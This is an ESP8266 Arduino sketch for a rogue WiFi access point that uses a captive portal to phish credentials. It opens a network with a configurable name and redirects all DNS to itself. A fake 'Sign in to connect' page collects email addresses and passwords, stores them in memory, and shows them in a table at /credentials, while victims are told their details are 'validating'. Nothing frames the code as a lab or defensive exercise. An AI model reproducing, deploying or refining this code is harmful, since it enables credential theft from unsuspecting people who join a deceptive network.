#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h>

class Node {
  private:
    Node* next;
    String username;
    String password;
  public:
    Node(String username, String password) {
      this->username = username;
      this->password = password;
      this->next = NULL;
    }

    void addNode(Node* node) {
      if(this->next == NULL) {
        next = node;
        return;
      }
      next->addNode(node);
    }

    Node* getNext() {
      return next;
    }

    String getUsername() {
      return username;
    }

    String getPassword() {
      return password;
    }
    
};

class List {
  private: 
    Node* start;
  public:
    List() {
      start = NULL;
    }

    void addNode(String username, String password) {
      Node* node = new Node(username, password);
      if(start == NULL) {
        start = node;
        return;
      }
      start->addNode(node);
    }

    Node* getStart() {
      return start;
    }
    
};

String SSID_NAME = "WiFi";
IPAddress IP(172, 217, 28, 1);
ESP8266WebServer webServer(80);

/* DNS Server */
const byte DNS_PORT = 53;
DNSServer dnsServer;

/* Credentials */
List credentials;

String input(String argument) {
  String arg = webServer.arg(argument);
  arg.substring(0, 100);
  return arg;
}

/* header */
String header(String title) {
  String css = ".container,.form-container input,.form-container label,body,form button{box-sizing:border-box}form button,nav{display:block;color:#fff;background:#004e98}.form-container,form button{margin:1em 0}body{color:#333;font-family:sans-serif;font-size:18px;line-height:24px;margin:0;padding:0}nav{font-size:1.3em;padding:1em}nav b{display:block;font-size:1.5em;margin-bottom:.5em}.container{padding:1em}.form-container input{width:100%;padding:5px 8px;display:block}.form-container input:focus{outline:0;border-color:#004e98}.form-container label{display:block}form button{padding:8px 16px;width:100%;border:none;border-radius:0;font-size:18px}form button:hover{cursor:pointer}.footer{text-align:center;font-size:12px}table,th,td{border:1px solid black; text-align: center;padding: 0.5em;}";
  return String("<!DOCTYPE html><html><head> <meta charset=\"UTF-8\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> <meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"/> <title>Login</title> <style>"+css+"</style></head><body><nav><b>"+SSID_NAME+"</b>"+title+"</nav><div class=\"container\">"); 
}

/* footer */
String footer() {
  return String("<div class=\"footer\">&copy; 2022 - Company Inc. All Rights reserved</div></div></body></html>");
}

String index() {
  String content = "<h2>Sign in</h2><h4>In order to connect to this wifi you need to sign in with your account details</h4><form method=\"POST\" action=\"/post\"><div class=\"form-container\"><label for=\"email\" >Email</label><input type=\"email\" name=\"email\" placeholder=\"johndoe@example.com\" required></div><div class=\"form-container\"><label for=\"email\">Password</label><input type=\"password\" name=\"password\" placeholder=\"Password\" required></div><input type=\"checkbox\" required=\"\" id=\"check\"><label for=\"check\"><small>I agree with the terms and services and the privacy policy.</small></label><button type=\"submit\">Connect</button></form>";
  return String(header("Login")+content+footer());
}

String settings() {
  String content = "<h2>Setting</h2><h4>Change the settings of the AP. This might disconnect you.</h4><form method=\"POST\" action=\"/changeSSID\"><div class=\"form-container\"><label for=\"ssid\" >SSID (WiFi Name)</label><input type=\"text\" name=\"SSID\" value=\""+SSID_NAME+"\" required></div><button type=\"submit\">Save</button></form>";
  return String(header("Login")+content+footer());
}

String validate() {
  String content ="<h2>Validating...</h2><h4>Account details are validating. Please allow up to 5 minutes for this.</h4>";
  return String(header("Validation")+content+footer());
}

/* Captive Portal URLs */
void handleRoot() {
  if(captivePortal()) {
    return;
  }
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");
  webServer.send(200, "text/html", index());
}

void handlePost() {
  String email = input("email");
  String password = input("password");
  credentials.addNode(email, password);
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");
  webServer.send(200, "text/html", validate());
}

void handleCreds() {
  String creds = "";
  Node* cur = credentials.getStart();
  while(cur != NULL) {
    creds += "<tr><td>" + cur->getUsername() + "</td><td>" + cur->getPassword() + "</td></tr>";
    cur = cur->getNext();  
  }
  String content = "<table><tr><th>Username</th><th>Password</th></tr>"+creds+"</table>";
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");
  webServer.send(200, "text/html", String(header("Credentials")+content+footer()));  
}

void handleCSV() {}

void handleSettings() {
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");
  webServer.send(200, "text/html", settings());
}

void changeSSID() {
  String newSSID = input("SSID");
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");
  webServer.send(200, "text/html", String(header("Success")+"<h2>Update successful</h2><h4>You might need to reconnect to the network</h4>"+footer())); 
  SSID_NAME = newSSID;
  WiFi.softAP(newSSID);
}

/* Handle 404 not found */
void handleNotFound() {
  if (captivePortal()) {
    return;
  }
  String message = F("File Not Found\n\n");
  message += F("URI: ");
  message += webServer.uri();
  message += F("\nMethod: ");
  message += (webServer.method() == HTTP_GET) ? "GET" : "POST";
  message += F("\nArguments: ");
  message += webServer.args();
  message += F("\n");

  for (uint8_t i = 0; i < webServer.args(); i++) {
    message += String(F(" ")) + webServer.argName(i) + F(": ") + webServer.arg(i) + F("\n");
  }
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");
  webServer.send(404, "text/plain", message);
}


/* Redirect to captive portal if request to another domain */
boolean captivePortal() {
  if(webServer.hostHeader() != "172.217.28.1") {
    webServer.sendHeader("Location", String("http://172.217.28.1"), true);

    webServer.send(302, "text/plain", "");
    webServer.client().stop();
    return true;
  }
  return false;
}

/* Setup ESP8266 Controller */
void setup() {
  /* Setup Access point */
  delay(1000);
  Serial.begin(115200);
  Serial.println();
  Serial.print("Starting Access Point");
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(IP, IP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  delay(500);

  /* Start DNS Server */
  Serial.println();
  Serial.print("Starting DNS Server");
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", IP);

  /* Configure WebServer for captive Portal */
  Serial.println();
  Serial.print("Starting Captive Portal");

  webServer.on("/", handleRoot);
  webServer.on("/post", handlePost);
  webServer.on("/credentials", handleCreds);
  webServer.on("/settings", handleSettings);
  webServer.on("/changeSSID", changeSSID);
  /* Links for captive portal */
  webServer.on("/generate_204", handleRoot); // Android Captive Portal
  webServer.on("/fwlink", handleRoot); // Microsoft Captive Portal
  webServer.on("/favicon.ico", handleRoot); // Another Android Captive Portal
  webServer.onNotFound(handleNotFound);
  webServer.begin();
}

void loop() {
  /* DNS */
  dnsServer.processNextRequest();
  /* WebServer */
  webServer.handleClient();
}